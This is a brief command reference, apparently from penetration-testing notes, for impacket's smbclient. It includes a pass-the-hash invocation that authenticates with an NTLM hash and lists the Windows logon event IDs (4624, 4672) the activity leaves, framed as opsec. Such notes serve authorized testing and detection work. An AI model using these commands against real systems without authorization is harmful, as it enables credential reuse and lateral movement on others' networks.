### source
https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbclient.py  

### impacket smbclient (supports pass-the-hash)
```
impacket-smbclient <domain>/<user>:<password>@<rhost>
```

### using pass the hash
```
impacket-smbclient -hashes :<ntlmHash> <domain>/<user>@<rhost>
```

### opsec considerations - Windows Security Log Event IDs
```
-Logon (4624) -> multiple
-Special Logon (4672) -> multiple
```
